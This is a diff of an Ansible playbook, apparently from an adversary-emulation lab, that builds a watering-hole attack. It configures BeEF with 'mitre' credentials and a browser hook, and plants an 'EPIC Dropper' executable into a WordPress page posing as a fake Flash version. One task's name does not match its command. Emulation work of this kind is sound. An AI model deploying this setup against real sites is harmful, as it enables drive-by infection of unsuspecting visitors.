@@ -25,28 +25,38 @@
       'replace beef-master/\.bundle/config.*:': "A" 
     chdir: /opt/watering_hole/
     echo: yes
+    timeout: null
   async: 7200
+  ignore_errors: true
   poll: 60
 
 - name: Edit username in beef-master/config.yaml 
+  become: yes
+  become_method: sudo
   ansible.builtin.lineinfile:
     path: /opt/watering_hole/beef-master/config.yaml 
     regexp: '^        user:\s*"beef"'
     line: '        user: "mitre"'
 
 - name: Edit password in beef-master/config.yaml 
+  become: yes
+  become_method: sudo
   ansible.builtin.lineinfile:
     path: /opt/watering_hole/beef-master/config.yaml 
     regexp: '^        passwd:\s*"beef"'
     line: '        passwd: "mitre"'
 
 - name: Edit beef hook in beef-master/config.yaml 
+  become: yes
+  become_method: sudo
   ansible.builtin.lineinfile:
     path: /opt/watering_hole/beef-master/config.yaml 
     regexp: '^        hook_session_name:\s*"BEEFHOOK"'
     line: '        hook_session_name: "MITREHOOK"'
 
 - name: Replace Local Host address with Server address
+  become: yes
+  become_method: sudo
   ansible.builtin.replace:
     path: /opt/watering_hole/in-range.html
     regexp: '127\.0\.0\.1\:3000'
@@ -80,11 +90,11 @@
 - name: Put EPIC Dropper on WordPress 
   become: yes
   become_method: sudo
-  command: /usr/bin/python3 flash_prep.py /srv/www/wordpress/index.php /home/{{ ansible_ssh_user }}/epic/dropper.exe 
+  command: /usr/bin/python3 flash_prep.py /srv/www/wordpress/index.php /home/{{ ansible_ssh_user }}/wordpress/EPICDropper_http.exe 
   args:
     chdir: /opt/watering_hole/
 
-- name: Rename NotFlashVersion.exe To NFVersion_5e.exe
+- name: Rename EPICDropper_http.exe To NFVersion_5e.exe
   command: mv /srv/www/wordpress/NotFlashVersion.exe /srv/www/wordpress/NFVersion.exe
 
 - name: Move Redirect Java Script
